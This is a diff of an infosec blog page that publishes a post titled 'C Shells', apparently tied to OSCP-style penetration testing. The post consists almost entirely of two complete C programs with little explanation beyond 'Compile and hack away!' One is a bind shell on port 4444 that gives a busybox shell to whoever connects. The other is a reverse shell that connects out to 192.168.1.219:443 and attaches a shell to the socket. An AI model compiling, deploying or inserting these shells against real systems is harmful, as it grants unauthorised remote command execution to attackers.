@@ -7,20 +7,40 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="generator" content="Hugo 0.55.4 with theme Tranquilpeak 0.4.3-SNAPSHOT">
 <meta name="author" content="Silverlak3">
-<meta name="keywords" content="">
-<meta name="description" content="Succurity Infosec Blog">
+<meta name="keywords" content="security, shells">
+<meta name="description" content="Today at work, we made these two C Shells. One is a bind shell and the other is a reverse shell. Compile and hack away!">
 
 
-<meta property="og:description" content="Succurity Infosec Blog">
-<meta property="og:type" content="website">
-<meta property="og:title" content="OSCP">
-<meta name="twitter:title" content="OSCP">
-<meta property="og:url" content="https://blog.succurity.com/tags/oscp/">
-<meta property="twitter:url" content="https://blog.succurity.com/tags/oscp/">
+<meta property="og:description" content="Today at work, we made these two C Shells. One is a bind shell and the other is a reverse shell. Compile and hack away!">
+<meta property="og:type" content="article">
+<meta property="og:title" content="C Shells">
+<meta name="twitter:title" content="C Shells">
+<meta property="og:url" content="https://blog.succurity.com/2019/05/c-shells/">
+<meta property="twitter:url" content="https://blog.succurity.com/2019/05/c-shells/">
 <meta property="og:site_name" content="Silverlake&#39;s Succurity Blog">
-<meta property="og:description" content="Succurity Infosec Blog">
-<meta name="twitter:description" content="Succurity Infosec Blog">
+<meta property="og:description" content="Today at work, we made these two C Shells. One is a bind shell and the other is a reverse shell. Compile and hack away!">
+<meta name="twitter:description" content="Today at work, we made these two C Shells. One is a bind shell and the other is a reverse shell. Compile and hack away!">
 <meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2019-05-02T20:24:45">
+  
+  
+    <meta property="article:modified_time" content="2019-05-02T20:24:45">
+  
+  
+  
+    
+      <meta property="article:section" content="posts">
+    
+  
+  
+    
+      <meta property="article:tag" content="security">
+    
+      <meta property="article:tag" content="shells">
+    
+  
 
 
 <meta name="twitter:card" content="summary">
@@ -43,16 +63,14 @@
   <meta property="twitter:image" content="https://blog.succurity.com/images/me.jpg">
 
 
-    <title>OSCP</title>
+    <title>C Shells</title>
 
     <link rel="icon" href="https://blog.succurity.com/favicon.png">
     
-      <link rel="alternate" type="application/rss+xml" title="RSS" href="https://blog.succurity.com/tags/oscp/index.xml">
-    
 
     
 
-    <link rel="canonical" href="https://blog.succurity.com/tags/oscp/">
+    <link rel="canonical" href="https://blog.succurity.com/2019/05/c-shells/">
 
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
@@ -76,7 +94,7 @@
 
   <body>
     <div id="blog">
-      <header id="header" data-behavior="1">
+      <header id="header" data-behavior="4">
   <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
   <div class="header-title">
     <a class="header-title-link" href="https://blog.succurity.com/">Silverlake&#39;s Succurity Blog</a>
@@ -96,7 +114,7 @@
   
 </header>
 
-      <nav id="sidebar" data-behavior="1">
+      <nav id="sidebar" data-behavior="4">
   <div class="sidebar-container">
     
       <div class="sidebar-profile">
@@ -195,44 +213,26 @@
 </nav>
 
       
-        
 
-      
-      <div id="main" data-behavior="1"
+      <div id="main" data-behavior="4"
         class="
                hasCoverMetaIn
                ">
-        
-          <section class="postShorten-group main-content-wrap">
-            
-            
-              
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
   
-    
-      
-        
-      
-    
+    <h1 class="post-title" itemprop="headline">
+      C Shells
+    </h1>
   
-
-
   
-
-<article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
-  <div class="postShorten-wrap">
-    
-    <div class="postShorten-header">
-      <h1 class="postShorten-title" itemprop="headline">
-        <a class="link-unstyled" href="https://blog.succurity.com/2019/05/oscp-field-guide/">
-          OSCP Field Guide
-        </a>
-      </h1>
-      
   <div class="postShorten-meta post-meta">
     
-      <time itemprop="datePublished" datetime="2019-05-01T16:14:05&#43;02:00">
+      <time itemprop="datePublished" datetime="2019-05-02T20:24:45&#43;02:00">
         
-  May 1, 2019
+  May 2, 2019
 
       </time>
     
@@ -241,31 +241,221 @@
   
     <span>in</span>
     
-      <a class="category-link" href="https://blog.succurity.com/categories/offsec">Offsec</a>
+      <a class="category-link" href="https://blog.succurity.com/categories/posts">posts</a>
     
   
 
   </div>
 
-    </div>
-    <div class="postShorten-excerpt" itemprop="articleBody">
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p>Today at work, we made these two C Shells. One is a bind shell and the other is a reverse shell. Compile and hack away!</p>
+
+<h3 id="bind-shell">Bind Shell</h3>
+
+<figure class="codeblock codeblock--tabbed">
+  <figcaption>
+    
+      <span>bind</span>
+    
+    <ul class="tabs">
       
-        
+        <li class="tab active">c</li>
       
-      <p>
-        <a href="https://blog.succurity.com/2019/05/oscp-field-guide/" class="postShorten-excerpt_link link">Continue reading</a>
-        
-      </p>
-    </div>
-  </div>
+    </ul>
+  </figcaption> 
+  <div class="tabs-content">
+    
+      
+      <figure class="highlight language-c" style="display: block;">   
+        <table>
+          <tbody>
+            <tr>
+              <td class="gutter">
+                <pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></pre>
+              </td>
+              <td class="code">
+                <pre class="code-highlight language-c"><code class="c">#include &lt;sys/socket.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#define LOCAL_PORT 4444
+
+int main()
+{
+  int resultfd, sockfd;
+  struct sockaddr_in my_addr;
+  char *args[] = { &#34;/bin/busybox&#34;, &#34;sh&#34;, NULL};
+  sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+  int one = 1;
+  setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;one, sizeof(one));
+
+  my_addr.sin_family = AF_INET; // 2
+  my_addr.sin_port = htons(LOCAL_PORT); // port number
+  my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP
+
+  bind(sockfd, (struct sockaddr *) &amp;my_addr, sizeof(my_addr));
+  listen(sockfd, 0);
+  resultfd = accept(sockfd, NULL, NULL);
+  dup2(resultfd, 2);
+  dup2(resultfd, 1);
+  dup2(resultfd, 0);
+  execve(args[0], &amp;args[0], 0);
+  return 0;
+}</code></pre>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </figure>
+    
+
+<p></div>
+</figure></p>
+
+<h3 id="reverse-shell">Reverse Shell</h3>
+
+<figure class="codeblock codeblock--tabbed">
+  <figcaption>
+    
+      <span>rev</span>
+    
+    <ul class="tabs">
+      
+        <li class="tab active">c</li>
+      
+    </ul>
+  </figcaption> 
+  <div class="tabs-content">
+    
+      
+      <figure class="highlight language-c" style="display: block;">   
+        <table>
+          <tbody>
+            <tr>
+              <td class="gutter">
+                <pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></pre>
+              </td>
+              <td class="code">
+                <pre class="code-highlight language-c"><code class="c">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;arpa/inet.h&gt;
+#define REMOTE_ADDR &#34;192.168.1.219&#34;
+#define REMOTE_PORT 443
+
+int main(int argc, char *argv[])
+{
+  struct sockaddr_in sa;
+  int s;
+  char *args[] = { &#34;/bin/busybox&#34;, &#34;sh&#34;, NULL};
+  sa.sin_family = AF_INET;
+  sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
+  sa.sin_port = htons(REMOTE_PORT);
+  s = socket(AF_INET, SOCK_STREAM, 0);
+  connect(s, (struct sockaddr *)&amp;sa, sizeof(sa));
+  dup2(s, 0);
+  dup2(s, 1);
+  dup2(s, 2);
+  execve(args[0], &amp;args[0], 0);
+  return 0;
+}</code></pre>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </figure>
+    
+
+<p></div>
+</figure></p>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://blog.succurity.com/tags/security/">security</a>
+
+  <a class="tag tag--primary tag--small" href="https://blog.succurity.com/tags/shells/">shells</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
   
-</article>
-
-            
-            
-
-          </section>
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://blog.succurity.com/2019/05/oscp-field-guide/" data-tooltip="OSCP Field Guide">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
         
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.succurity.com/2019/05/c-shells/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://blog.succurity.com/2019/05/c-shells/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+      
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+            
+          </div>
+        </article>
         <footer id="footer" class="main-content-wrap">
   <span class="copyrights">
     &copy; 2019 Silverlak3. All Rights Reserved
@@ -273,6 +463,84 @@
 </footer>
 
       </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://blog.succurity.com/2019/05/oscp-field-guide/" data-tooltip="OSCP Field Guide">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.succurity.com/2019/05/c-shells/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://blog.succurity.com/2019/05/c-shells/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+      
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fblog.succurity.com%2F2019%2F05%2Fc-shells%2F">
+          <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fblog.succurity.com%2F2019%2F05%2Fc-shells%2F">
+          <i class="fa fa-twitter"></i><span>Share on Twitter</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
     </div>
     
     <div id="about">
@@ -470,6 +738,10 @@ $(document).ready(function() {
 });
 </script>
 
+
+  
+    
+  
 
 
 
